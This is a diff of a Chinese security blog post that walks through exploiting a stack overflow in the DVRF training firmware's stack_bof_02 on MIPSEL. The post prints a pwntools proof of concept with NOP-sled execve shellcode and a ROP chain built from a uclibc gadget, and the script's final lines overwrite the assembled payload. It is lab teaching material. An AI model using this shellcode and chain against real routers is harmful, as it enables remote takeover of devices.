@@ -45,7 +45,7 @@
     
     <title>
         
-            分类: jeb破解 | 
+            一步一步pwn路由器之rop技术实战 | 
         
         穷则变，变则通，通则久
     </title>
@@ -57,7 +57,7 @@
     <meta name="theme-color" content="#0097A7">
     <meta name="author" content="hac425">
     <meta name="description" itemprop="description" content="">
-    <meta name="keywords" content="">
+    <meta name="keywords" content=",mips rop,栈溢出">
 
     <!-- Import lsloader -->
     <script>(function(){window.lsloader={jsRunSequence:[],jsnamemap:{},cssnamemap:{}};lsloader.removeLS=function(key){try{localStorage.removeItem(key)}catch(e){}};lsloader.setLS=function(key,val){try{localStorage.setItem(key,val)}catch(e){}};lsloader.getLS=function(key){var val="";try{val=localStorage.getItem(key)}catch(e){val=""}return val};versionString="/*"+(window.materialVersion||"unknownVersion")+"*/";lsloader.clean=function(){try{var keys=[];for(var i=0;i<localStorage.length;i++){keys.push(localStorage.key(i))}keys.forEach(function(key){var data=lsloader.getLS(key);if(window.oldVersion){var remove=window.oldVersion.reduce(function(p,c){return p||data.indexOf("/*"+c+"*/")!==-1},false);if(remove){lsloader.removeLS(key)}}})}catch(e){}};lsloader.clean();lsloader.load=function(jsname,jspath,cssonload,isJs){if(typeof cssonload==="boolean"){isJs=cssonload;cssonload=undefined}isJs=isJs||false;cssonload=cssonload||function(){};var code;code=this.getLS(jsname);if(code&&code.indexOf(versionString)===-1){this.removeLS(jsname);this.requestResource(jsname,jspath,cssonload,isJs);return}if(code){var versionNumber=code.split(versionString)[0];if(versionNumber!=jspath){console.log("reload:"+jspath);this.removeLS(jsname);this.requestResource(jsname,jspath,cssonload,isJs);return}code=code.split(versionString)[1];if(isJs){this.jsRunSequence.push({name:jsname,code:code});this.runjs(jspath,jsname,code)}else{document.getElementById(jsname).appendChild(document.createTextNode(code));cssonload()}}else{this.requestResource(jsname,jspath,cssonload,isJs)}};lsloader.requestResource=function(name,path,cssonload,isJs){var that=this;if(isJs){this.iojs(path,name,function(path,name,code){that.setLS(name,path+versionString+code);that.runjs(path,name,code)})}else{this.iocss(path,name,function(code){document.getElementById(name).appendChild(document.createTextNode(code));that.setLS(name,path+versionString+code)},cssonload)}};lsloader.iojs=function(path,jsname,callback){var that=this;that.jsRunSequence.push({name:jsname,code:""});try{var xhr=new XMLHttpRequest;xhr.open("get",path,true);xhr.onreadystatechange=function(){if(xhr.readyState==4){if(xhr.status>=200&&xhr.status<300||xhr.status==304){if(xhr.response!=""){callback(path,jsname,xhr.response);return}}that.jsfallback(path,jsname)}};xhr.send(null)}catch(e){that.jsfallback(path,jsname)}};lsloader.iocss=function(path,jsname,callback,cssonload){var that=this;try{var xhr=new XMLHttpRequest;xhr.open("get",path,true);xhr.onreadystatechange=function(){if(xhr.readyState==4){if(xhr.status>=200&&xhr.status<300||xhr.status==304){if(xhr.response!=""){callback(xhr.response);cssonload();return}}that.cssfallback(path,jsname,cssonload)}};xhr.send(null)}catch(e){that.cssfallback(path,jsname,cssonload)}};lsloader.iofonts=function(path,jsname,callback,cssonload){var that=this;try{var xhr=new XMLHttpRequest;xhr.open("get",path,true);xhr.onreadystatechange=function(){if(xhr.readyState==4){if(xhr.status>=200&&xhr.status<300||xhr.status==304){if(xhr.response!=""){callback(xhr.response);cssonload();return}}that.cssfallback(path,jsname,cssonload)}};xhr.send(null)}catch(e){that.cssfallback(path,jsname,cssonload)}};lsloader.runjs=function(path,name,code){if(!!name&&!!code){for(var k in this.jsRunSequence){if(this.jsRunSequence[k].name==name){this.jsRunSequence[k].code=code}}}if(!!this.jsRunSequence[0]&&!!this.jsRunSequence[0].code&&this.jsRunSequence[0].status!="failed"){var script=document.createElement("script");script.appendChild(document.createTextNode(this.jsRunSequence[0].code));script.type="text/javascript";document.getElementsByTagName("head")[0].appendChild(script);this.jsRunSequence.shift();if(this.jsRunSequence.length>0){this.runjs()}}else if(!!this.jsRunSequence[0]&&this.jsRunSequence[0].status=="failed"){var that=this;var script=document.createElement("script");script.src=this.jsRunSequence[0].path;script.type="text/javascript";this.jsRunSequence[0].status="loading";script.onload=function(){that.jsRunSequence.shift();if(that.jsRunSequence.length>0){that.runjs()}};document.body.appendChild(script)}};lsloader.tagLoad=function(path,name){this.jsRunSequence.push({name:name,code:"",path:path,status:"failed"});this.runjs()};lsloader.jsfallback=function(path,name){if(!!this.jsnamemap[name]){return}else{this.jsnamemap[name]=name}for(var k in this.jsRunSequence){if(this.jsRunSequence[k].name==name){this.jsRunSequence[k].code="";this.jsRunSequence[k].status="failed";this.jsRunSequence[k].path=path}}this.runjs()};lsloader.cssfallback=function(path,name,cssonload){if(!!this.cssnamemap[name]){return}else{this.cssnamemap[name]=1}var link=document.createElement("link");link.type="text/css";link.href=path;link.rel="stylesheet";link.onload=link.onerror=cssonload;var root=document.getElementsByTagName("script")[0];root.parentNode.insertBefore(link,root)};lsloader.runInlineScript=function(scriptId,codeId){var code=document.getElementById(codeId).innerText;this.jsRunSequence.push({name:scriptId,code:code});this.runjs()};lsloader.loadCombo=function(jslist){var updateList="";var requestingModules={};for(var k in jslist){var LS=this.getLS(jslist[k].name);if(!!LS){var version=LS.split(versionString)[0];var code=LS.split(versionString)[1]}else{var version=""}if(version==jslist[k].path){this.jsRunSequence.push({name:jslist[k].name,code:code,path:jslist[k].path})}else{this.jsRunSequence.push({name:jslist[k].name,code:null,path:jslist[k].path,status:"comboloading"});requestingModules[jslist[k].name]=true;updateList+=(updateList==""?"":";")+jslist[k].path}}var that=this;if(!!updateList){var xhr=new XMLHttpRequest;xhr.open("get",combo+updateList,true);xhr.onreadystatechange=function(){if(xhr.readyState==4){if(xhr.status>=200&&xhr.status<300||xhr.status==304){if(xhr.response!=""){that.runCombo(xhr.response,requestingModules);return}}else{for(var i in that.jsRunSequence){if(requestingModules[that.jsRunSequence[i].name]){that.jsRunSequence[i].status="failed"}}that.runjs()}}};xhr.send(null)}this.runjs()};lsloader.runCombo=function(comboCode,requestingModules){comboCode=comboCode.split("/*combojs*/");comboCode.shift();for(var k in this.jsRunSequence){if(!!requestingModules[this.jsRunSequence[k].name]&&!!comboCode[0]){this.jsRunSequence[k].status="comboJS";this.jsRunSequence[k].code=comboCode[0];this.setLS(this.jsRunSequence[k].name,this.jsRunSequence[k].path+versionString+comboCode[0]);comboCode.shift()}}this.runjs()}})();</script>
@@ -239,15 +239,18 @@
     <!-- The Open Graph protocol -->
     <meta property="og:url" content="http://jinyu00.github.io">
     <meta property="og:type" content="blog">
-    <meta property="og:title" content="分类: jeb破解 | 穷则变，变则通，通则久">
+    <meta property="og:title" content="一步一步pwn路由器之rop技术实战 | 穷则变，变则通，通则久">
     <meta property="og:image" content="http://jinyu00.github.io/img/girl.png" />
     <meta property="og:description" content="">
-    
+    <meta property="og:article:tag" content="mips rop"> <meta property="og:article:tag" content="栈溢出"> 
 
+    
+        <meta property="article:published_time" content="Sat Oct 28 2017 11:47:00 GMT+0800" />
+        <meta property="article:modified_time" content="Sat Oct 28 2017 12:17:44 GMT+0800" />
     
 
     <!-- The Twitter Card protocol -->
-    <meta name="twitter:title" content="分类: jeb破解 | 穷则变，变则通，通则久">
+    <meta name="twitter:title" content="一步一步pwn路由器之rop技术实战 | 穷则变，变则通，通则久">
     <meta name="twitter:description" content="">
     <meta name="twitter:image" content="http://jinyu00.github.io/img/girl.png">
     <meta name="twitter:card" content="summary_large_image" />
@@ -255,13 +258,43 @@
 
     <!-- Add canonical link for SEO -->
     
-        <link rel="canonical" href="http://jinyu00.github.io/categories/jeb破解/index.html" />
+        <link rel="canonical" href="http://jinyu00.github.io/路由器安全/2017-10-28-一步一步pwn路由器之rop技术实战.html" />
     
 
     <!-- Structured-data for SEO -->
     
         
 
+
+<script type="application/ld+json">
+{
+    "@context": "https://schema.org",
+    "@type": "BlogPosting",
+    "mainEntityOfPage": "http://jinyu00.github.io/路由器安全/2017-10-28-一步一步pwn路由器之rop技术实战.html",
+    "headline": "一步一步pwn路由器之rop技术实战",
+    "datePublished": "Sat Oct 28 2017 11:47:00 GMT+0800",
+    "dateModified": "Sat Oct 28 2017 12:17:44 GMT+0800",
+    "author": {
+        "@type": "Person",
+        "name": "hac425",
+        "image": {
+            "@type": "ImageObject",
+            "url": "/img/girl.png"
+        },
+        "description": "纵横捭阖，冷心为上"
+    },
+    "publisher": {
+        "@type": "Organization",
+        "name": "穷则变，变则通，通则久",
+        "logo": {
+            "@type":"ImageObject",
+            "url": "/img/girl.png"
+        }
+    },
+    "keywords": ",mips rop,栈溢出",
+    "description": "",
+}
+</script>
 
 
     
@@ -304,159 +337,285 @@
                         </button>
                     
 
-                    <!-- Index Module -->
-<div class="material-index mdl-grid">
-    
-    <div class="locate-thumbnail-symbol"></div>
+                    <!-- Post TOC -->
 
-    <!-- Pin on top -->
+    
+    <!-- Back Button -->
+    <!--
+    <div class="material-back" id="backhome-div" tabindex="0">
+        <a class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon"
+           href="#" onclick="window.history.back();return false;"
+           target="_self"
+           role="button"
+           data-upgraded=",MaterialButton,MaterialRipple">
+            <i class="material-icons" role="presentation">arrow_back</i>
+            <span class="mdl-button__ripple-container">
+                <span class="mdl-ripple"></span>
+            </span>
+        </a>
+    </div>
+    -->
+
+
+    <!-- Left aligned menu below button -->
+    
+    
+    <button id="post-toc-trigger-btn"
+        class="mdl-button mdl-js-button mdl-button--icon">
+        <i class="material-icons">format_list_numbered</i>
+    </button>
+
+    <ul class="post-toc-wrap mdl-menu mdl-menu--bottom-left mdl-js-menu mdl-js-ripple-effect" for="post-toc-trigger-btn" style="max-height:80vh; overflow-y:scroll;">
+        <ol class="post-toc"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#前言"><span class="post-toc-number">1.</span> <span class="post-toc-text">前言</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#正文"><span class="post-toc-number">2.</span> <span class="post-toc-text">正文</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#总结"><span class="post-toc-number">3.</span> <span class="post-toc-text">总结</span></a></li></ol>
+    </ul>
     
 
-    <!-- Normal Post -->
-    
-        
-            
-                <!-- Paradox Thumbnail -->
-                <div class="post_entry-module mdl-card mdl-shadow--2dp mdl-cell mdl-cell--12-col fade out">
-    <!-- Post Thumbnail -->
+
+
+
+<!-- Layouts -->
+
+    <!-- Post Module -->
+    <div class="material-post_container">
+
+        <div class="material-post mdl-grid">
+            <div class="mdl-card mdl-shadow--4dp mdl-cell mdl-cell--12-col">
+
+                <!-- Post Header(Thumbnail & Title) -->
+                
+    <!-- Paradox Post Header -->
     
         
             <!-- Random Thumbnail -->
             <div class="post_thumbnail-random mdl-card__media mdl-color-text--grey-50">
-        
-    
+            <script type="text/ls-javascript" id="post-thumbnail-script">
+    var randomNum = Math.floor(Math.random() * 19 + 1);
 
-        <!-- Post Title -->
-        <p class="article-headline-p"><a href="/jeb破解/2017-10-27-破解-jeb-2-3-7-demo.html">破解 jeb  2.3.7 demo</a></p>
-    </div>
-
-    <!-- Post Excerpt -->
-    <div class="mdl-color-text--grey-600 mdl-card__supporting-text post_entry-content">
-        
-            前言使用的技术和上...
-        
-        &nbsp;&nbsp;&nbsp;
-        <span>
-            <a href="/jeb破解/2017-10-27-破解-jeb-2-3-7-demo.html" target="_self">阅读全文</a>
-        </span>
-    </div>
-    <!-- Post_entry Info-->
-    <div id="post_entry-info">
-        <div id="post_entry-left-info" class="mdl-card__supporting-text meta mdl-color-text--grey-600 ">
-            <!-- Author Avatar -->
-            <div id="author-avatar">
-                <img src="/img/girl.png" width="44px" height="44px" alt="hac425's avatar">
-            </div>
-            <div>
-                <strong>hac425</strong>
-                <span>10月 27, 2017</span>
-            </div>
-        </div>
-        <div id="post_entry-right-info">
-          
-              <!-- Category -->
-              <span class="post_entry-category">
-                  <a class="post_category-link" href="/categories/jeb破解/">jeb破解</a>
-              </span>
-            
-
-            
-
-            
-
-            <!-- Post Views -->
-            <span class="post_entry-views">
-            </span>
-        </div>
-    </div>
-</div>
-
-            
-            
-        
-    
-        
-            
-                <!-- Paradox Thumbnail -->
-                <div class="post_entry-module mdl-card mdl-shadow--2dp mdl-cell mdl-cell--12-col fade out">
-    <!-- Post Thumbnail -->
-    
-        
-            <!-- Random Thumbnail -->
-            <div class="post_thumbnail-random mdl-card__media mdl-color-text--grey-50">
-        
-    
-
-        <!-- Post Title -->
-        <p class="article-headline-p"><a href="/jeb破解/2017-10-23-java应用破解之破解-jeb-mips-2-3-3.html">java应用破解之破解 jeb mips 2.3.3 </a></p>
-    </div>
-
-    <!-- Post Excerpt -->
-    <div class="mdl-color-text--grey-600 mdl-card__supporting-text post_entry-content">
-        
-            前言由于要去学习路...
-        
-        &nbsp;&nbsp;&nbsp;
-        <span>
-            <a href="/jeb破解/2017-10-23-java应用破解之破解-jeb-mips-2-3-3.html" target="_self">阅读全文</a>
-        </span>
-    </div>
-    <!-- Post_entry Info-->
-    <div id="post_entry-info">
-        <div id="post_entry-left-info" class="mdl-card__supporting-text meta mdl-color-text--grey-600 ">
-            <!-- Author Avatar -->
-            <div id="author-avatar">
-                <img src="/img/girl.png" width="44px" height="44px" alt="hac425's avatar">
-            </div>
-            <div>
-                <strong>hac425</strong>
-                <span>10月 23, 2017</span>
-            </div>
-        </div>
-        <div id="post_entry-right-info">
-          
-              <!-- Category -->
-              <span class="post_entry-category">
-                  <a class="post_category-link" href="/categories/jeb破解/">jeb破解</a>
-              </span>
-            
-
-            
-
-            
-
-            <!-- Post Views -->
-            <span class="post_entry-views">
-            </span>
-        </div>
-    </div>
-</div>
-
-            
-            
-        
-    
-
-    
-
-    
-        <script type="text/ls-javascript" id="thumbnail-script">
-    var randomNum;
-
-    var locatePost = $('.locate-thumbnail-symbol').next();
-    for(var i = 0; i < 10; i++) {
-        randomNum = Math.floor(Math.random() * 19 + 1);
-
-        locatePost.children('.post_thumbnail-random').attr('id', 'random_thumbnail-'+randomNum);
-        locatePost.children('.post_thumbnail-random').attr('data-original', '/img/random/material-' + randomNum + '.png');
+    $('.post_thumbnail-random').attr('data-original', '/img/random/material-' + randomNum + '.png');
     $('.post_thumbnail-random').addClass('lazy');
-
-        locatePost = locatePost.next();
-    }
 </script>
 
+        
+    
+            <p class="article-headline-p">
+                一步一步pwn路由器之rop技术实战
+            </p>
+        </div>
+
+
+
+
+
+                
+                    <!-- Paradox Post Info -->
+                    <div class="mdl-color-text--grey-700 mdl-card__supporting-text meta">
+
+    <!-- Author Avatar -->
+    <div id="author-avatar">
+        <img src="/img/girl.png" width="44px" height="44px" alt="Author Avatar"/>
+    </div>
+    <!-- Author Name & Date -->
+    <div>
+        <strong>hac425</strong>
+        <span>10月 28, 2017</span>
+    </div>
+
+    <div class="section-spacer"></div>
+
+    <!-- Favorite -->
+    <!--
+        <button id="article-functions-like-button" class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon btn-like">
+            <i class="material-icons" role="presentation">favorite</i>
+            <span class="visuallyhidden">favorites</span>
+        </button>
+    -->
+
+    <!-- Qrcode -->
+    
+        <button id="article-functions-qrcode-button" class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon">
+    <i class="material-icons" role="presentation">devices other</i>
+    <span class="visuallyhidden">devices other</span>
+</button>
+<ul class="mdl-menu mdl-menu--bottom-right mdl-js-menu mdl-js-ripple-effect" for="article-functions-qrcode-button">
+    <li class="mdl-menu__item">在其它设备中阅读本文章</li>
+    
+        <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAQ4AAAEOCAAAAABd2qZ5AAADl0lEQVR42u3awY7iQAwEUP7/p3evIyGgyk4zWe3LCQ2QdD8ONW378cf143ogwIEDBw4cOHDgwIHjxhyP+Pr5+efXz3d7/nvyrfwO+X0+3BkHDhw4cBzg+BBFL5aScCTffbWGV59s7/N+vzhw4MCB4xxH/pjZxlqy2bv1XnDgwIEDx69yzII5CdH3f8/fxYEDBw4c/xbHDCgJ6dnmb/R/Bw4cOHDgWBTUZq2mfUtpFuoHa6U4cODAgePYQMN9Xt9ivgMHDhw4/mOO9mojMxlEyIMzOfjVO8KBAwcOHJdyJOMC7ZBBW8Jrm1j5MS86HOLAgQMHjgMcSey1EMlBMSHbHDij8MaBAwcOHJdy5Aewtv2TB+rs821Uv1w5Dhw4cOA4xtFCDIMtpmlDvf2nAQcOHDhwnOBoC3/tKNus7XTVGoZD2Dhw4MCBY8HRRuasvdTG+XCcenYfHDhw4MBxgKNt6uRtpDb82qZUO9aAAwcOHDhOc+Sj0t8J3bYBlv8kRXEQBw4cOHAsONqGzezB7+N2uI1Zk2lTHMSBAwcOHDFHXijMBwvyp2wC+4KV4MCBAweOYxzJsvJobAcR8ntujoVF0OLAgQMHjjVHvsT8mDSjuSqMoyfiwIEDB45LOc4dyfbFu83hrShc4sCBAweOAxwzmjbk2gGF9unDoicOHDhw4DjMkSxuNmqwLz7uP/+h7YQDBw4cONYcyWGp3eRmAK49nrU/LQ4cOHDg+CZHHoTtka8t87UDDbPgx4EDBw4cJziuLQXmW509sQ3y6MfAgQMHDhyXcuSlwLapk5cUkwPkbIRiODmIAwcOHDjWHC3KVfHZIubhigMHDhw47sDRxudmWG1VzluXC3HgwIEDx2mO9w/OozS/T95qmj29GNTDgQMHDhyXcrTDBEm8Jce2vIGUHAvzg2LdhcOBAwcOHCVHHq7J61lbaPaZPOZXJ1ocOHDgwDHi2BTjZoHaDkzkT2zJcODAgQPHCY62EZVH7OZoF22mbFzhwIEDB47THLNS4AaiHarbHzJx4MCBA8f3OdpwzReRjya0B7D9OB0OHDhw4DjN0Y6pJRvYxGQe223jCgcOHDhw3IcjafDkW23bTnnL6ktBiwMHDhw4jnEkcbsvNbaNpWiFOHDgwIHjGEceZnnQ5k2m/OdpA/XDHXDgwIEDxwGOywpt8RjErH2VvFsHNg4cOHDguJTDhQMHDhw4cODAgQMHjptdfwH7n5aHd2NNNgAAAABJRU5ErkJggg==">
+    
+</ul>
+
+    
+
+    <!-- Tags (bookmark) -->
+    
+    <button id="article-functions-viewtags-button" class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon">
+        <i class="material-icons" role="presentation">bookmark</i>
+        <span class="visuallyhidden">bookmark</span>
+    </button>
+    <ul class="mdl-menu mdl-menu--bottom-right mdl-js-menu mdl-js-ripple-effect" for="article-functions-viewtags-button">
+        <li class="mdl-menu__item">
+        <a class="post_tag-link" href="/tags/mips-rop/">mips rop</a></li><li class="mdl-menu__item"><a class="post_tag-link" href="/tags/栈溢出/">栈溢出</a>
+    </ul>
+    
+
+    <!-- Share -->
+    <button id="article-fuctions-share-button" class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon">
+    <i class="material-icons" role="presentation">share</i>
+    <span class="visuallyhidden">share</span>
+</button>
+<ul class="mdl-menu mdl-menu--bottom-right mdl-js-menu mdl-js-ripple-effect" for="article-fuctions-share-button">
+    
+
+    
+        
+            <!-- Busuanzi Views -->
+            <a class="post_share-link" href="#">
+                <li class="mdl-menu__item">
+                    <span id="busuanzi_container_page_pv">
+                        <span id="busuanzi_value_page_pv"></span>&nbsp;浏览量
+                    </span>
+                </li>
+            </a>
+        
+    
+
+    <!-- Share Weibo -->
+    
+        <a class="post_share-link" href="http://service.weibo.com/share/share.php?appkey=&title=一步一步pwn路由器之rop技术实战&url=http://jinyu00.github.io/路由器安全/2017-10-28-一步一步pwn路由器之rop技术实战.html&pic=http://jinyu00.github.io/img/girl.png&searchPic=false&style=simple" target="_blank">
+            <li class="mdl-menu__item">
+                分享到微博
+            </li>
+        </a>
+    
+
+    <!-- Share Twitter -->
+    
+        <a class="post_share-link" href="https://twitter.com/intent/tweet?text=一步一步pwn路由器之rop技术实战&url=http://jinyu00.github.io/路由器安全/2017-10-28-一步一步pwn路由器之rop技术实战.html&via=hac425" target="_blank">
+            <li class="mdl-menu__item">
+                分享到 Twitter
+            </li>
+        </a>
+    
+
+    <!-- Share Facebook -->
+    
+        <a class="post_share-link" href="https://www.facebook.com/sharer/sharer.php?u=http://jinyu00.github.io/路由器安全/2017-10-28-一步一步pwn路由器之rop技术实战.html" target="_blank">
+            <li class="mdl-menu__item">
+                分享到 Facebook
+            </li>
+        </a>
+    
+
+    <!-- Share Google+ -->
+    
+        <a class="post_share-link" href="https://plus.google.com/share?url=http://jinyu00.github.io/路由器安全/2017-10-28-一步一步pwn路由器之rop技术实战.html" target="_blank">
+            <li class="mdl-menu__item">
+                分享到 Google+
+            </li>
+        </a>
+    
+
+    <!-- Share LinkedIn -->
+    
+
+    <!-- Share QQ -->
+    
+
+    <!-- Share Telegram -->
+    
+</ul>
+
+</div>
+
+                
+
+                <!-- Post Content -->
+                <div id="post-content" class="mdl-color-text--grey-700 mdl-card__supporting-text fade out">
+    
+        <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>这次程序也是 DVRF 里面的，他的路径是 <code>pwnable/ShellCode_Required/stack_bof_02</code> , 同样是一个简单的栈溢出，不过这个程序里面没有提供 <code>getshell</code> 的函数，需要我们执行shellcode来实现。这个正好实战下前文: <a href="https://jinyu00.github.io/%E8%B7%AF%E7%94%B1%E5%99%A8%E5%AE%89%E5%85%A8/2017-10-26-%E4%B8%80%E6%AD%A5%E4%B8%80%E6%AD%A5pwn%E8%B7%AF%E7%94%B1%E5%99%A8%E4%B9%8B%E8%B7%AF%E7%94%B1%E5%99%A8%E7%8E%AF%E5%A2%83%E4%BF%AE%E5%A4%8D-rop%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90.html">一步一步pwn路由器之路由器环境修复&amp;&amp;rop技术分析</a>,中分析的在mips下的通用的rop技术。</p>
+<h3 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h3><p>首先使用 <code>qemu</code> 运行目标程序，并等待 <code>gdb</code> 来调试。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo chroot . ./qemu-mipsel-static -g 1234 ./pwnable/ShellCode_Required/stack_bof_02  &quot;`cat ./pwnable/Intro/input`&quot;</div></pre></td></tr></table></figure></p>
+<p>使用pwntools的 cyclic 功能，找到偏移<br><img src="http://oy9h5q2k4.bkt.clouddn.com/15091628511130mev14fe.png?imageslim" alt="paste image"><br>验证一下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">payload = &quot;A&quot; * 508 + &apos;B&apos; * 4</div><div class="line"></div><div class="line">with open(&quot;input&quot;, &quot;wb&quot;) as f:</div><div class="line">    f.write(payload)</div></pre></td></tr></table></figure></p>
+<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1509163815793mv4b39p0.png?imageslim" alt="paste image"><br>OK, 现在我们已经可以控制程序的 <code>$pc</code>寄存器了，下一步就是利用的方法了。使用前文的那个 rop 链，我们需要可以控制 <code>$s1</code>寄存器。但是这里我们并没有办法控制。不过在 <a href="https://jinyu00.github.io/%E8%B7%AF%E7%94%B1%E5%99%A8%E5%AE%89%E5%85%A8/2017-10-27-MIPS-rop-gadgets%E8%AE%B0%E5%BD%95%E8%B4%B4-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0.html">这里</a>提到，在 <code>uclibc</code> 的 <code>scandir</code> 或者 <code>scandir64</code> 的函数末尾有一个<code>gadgets</code> 可以操控几乎所有寄存器。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">.text:0000AFE0                 lw      $ra, 0x40+var_4($sp)</div><div class="line">.text:0000AFE4                 lw      $fp, 0x40+var_8($sp)</div><div class="line">.text:0000AFE8                 lw      $s7, 0x40+var_C($sp)</div><div class="line">.text:0000AFEC                 lw      $s6, 0x40+var_10($sp)</div><div class="line">.text:0000AFF0                 lw      $s5, 0x40+var_14($sp)</div><div class="line">.text:0000AFF4                 lw      $s4, 0x40+var_18($sp)</div><div class="line">.text:0000AFF8                 lw      $s3, 0x40+var_1C($sp)</div><div class="line">.text:0000AFFC                 lw      $s2, 0x40+var_20($sp)</div><div class="line">.text:0000B000                 lw      $s1, 0x40+var_24($sp)</div><div class="line">.text:0000B004                 lw      $s0, 0x40+var_28($sp)</div><div class="line">.text:0000B008                 jr      $ra</div><div class="line">.text:0000B00C                 addiu   $sp, 0x40</div><div class="line">.text:0000B00C  # End of function scandir64</div></pre></td></tr></table></figure>
+<p>于是利用的思路就很明确了。首先使用这段 <code>rop gadgets</code> 设置好寄存器，然后进入前文所说的 <code>rop</code> 链中执行。<br>最后的poc如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div></pre></td><td class="code"><pre><div class="line">#!/usr/bin/python</div><div class="line">from pwn import *</div><div class="line">context.endian = &quot;little&quot;</div><div class="line">context.arch = &quot;mips&quot;</div><div class="line"></div><div class="line">payload = &quot;&quot;</div><div class="line"></div><div class="line"># NOP sled (XOR $t0, $t0, $t0; as NOP is only null bytes)</div><div class="line">for i in range(30):</div><div class="line">    payload += &quot;\x26\x40\x08\x01&quot;</div><div class="line"></div><div class="line"># execve shellcode translated from MIPS to MIPSEL</div><div class="line"># http://shell-storm.org/shellcode/files/shellcode-792.php</div><div class="line">payload += &quot;\xff\xff\x06\x28&quot;  # slti $a2, $zero, -1</div><div class="line">payload += &quot;\x62\x69\x0f\x3c&quot;  # lui $t7, 0x6962</div><div class="line">payload += &quot;\x2f\x2f\xef\x35&quot;  # ori $t7, $t7, 0x2f2f</div><div class="line">payload += &quot;\xf4\xff\xaf\xaf&quot;  # sw $t7, -0xc($sp)</div><div class="line">payload += &quot;\x73\x68\x0e\x3c&quot;  # lui $t6, 0x6873</div><div class="line">payload += &quot;\x6e\x2f\xce\x35&quot;  # ori $t6, $t6, 0x2f6e</div><div class="line">payload += &quot;\xf8\xff\xae\xaf&quot;  # sw $t6, -8($sp)</div><div class="line">payload += &quot;\xfc\xff\xa0\xaf&quot;  # sw $zero, -4($sp)</div><div class="line">payload += &quot;\xf4\xff\xa4\x27&quot;  # addiu $a0, $sp, -0xc</div><div class="line">payload += &quot;\xff\xff\x05\x28&quot;  # slti $a1, $zero, -1</div><div class="line">payload += &quot;\xab\x0f\x02\x24&quot;  # addiu;$v0, $zero, 0xfab</div><div class="line">payload += &quot;\x0c\x01\x01\x01&quot;  # syscall 0x40404</div><div class="line">shellcode = payload</div><div class="line"></div><div class="line"></div><div class="line">padding = &quot;O&quot; * 508</div><div class="line">payload = padding</div><div class="line">payload += p32(0x766effe0)</div><div class="line">payload += &apos;B&apos; * 0x18</div><div class="line">payload += &apos;A&apos; * 4  # $s0</div><div class="line">payload += p32(0x7670303c)  # $s1</div><div class="line">payload += &apos;A&apos; * 4  # $s2</div><div class="line">payload += &apos;A&apos; * 4  # $s3</div><div class="line">payload += &apos;A&apos; * 4  # $s4</div><div class="line">payload += &apos;A&apos; * 4  # $s5</div><div class="line">payload += &apos;A&apos; * 4  # $s6</div><div class="line">payload += &apos;A&apos; * 4  # $s7</div><div class="line">payload += &apos;A&apos; * 4  # $fp</div><div class="line">payload += p32(0x76714b10)  # $ra for jmp</div><div class="line"></div><div class="line"># stack for gadget 2</div><div class="line">payload += &apos;B&apos; * 0x18</div><div class="line">payload += &apos;A&apos; * 4  # $s0</div><div class="line">payload += p32(0x0002F2B0 + 0x766e5000)  # $s1</div><div class="line">payload += &apos;A&apos; * 4  # $s2</div><div class="line">payload += p32(0x766fbdd0)  # $ra</div><div class="line"></div><div class="line"></div><div class="line"># stack for gadget 2 for second</div><div class="line">payload += &apos;B&apos; * 0x18</div><div class="line">payload += p32(0x767064a0)  # $s0  for jmp stack</div><div class="line">payload += p32(0x0002F2B0 + 0x766e5000)  # $s1</div><div class="line">payload += &apos;A&apos; * 4  # $s2</div><div class="line">payload += p32(0x766fbdd0)  # $ra for get stack addr</div><div class="line"></div><div class="line"># stack for shellcode</div><div class="line">payload += shellcode</div><div class="line"></div><div class="line">payload = &quot;A&quot; * 508 + &apos;B&apos; * 4</div><div class="line"></div><div class="line">with open(&quot;input&quot;, &quot;wb&quot;) as f:</div><div class="line">    f.write(payload)</div><div class="line"></div><div class="line"></div><div class="line"># base 0x766e5000</div></pre></td></tr></table></figure></p>
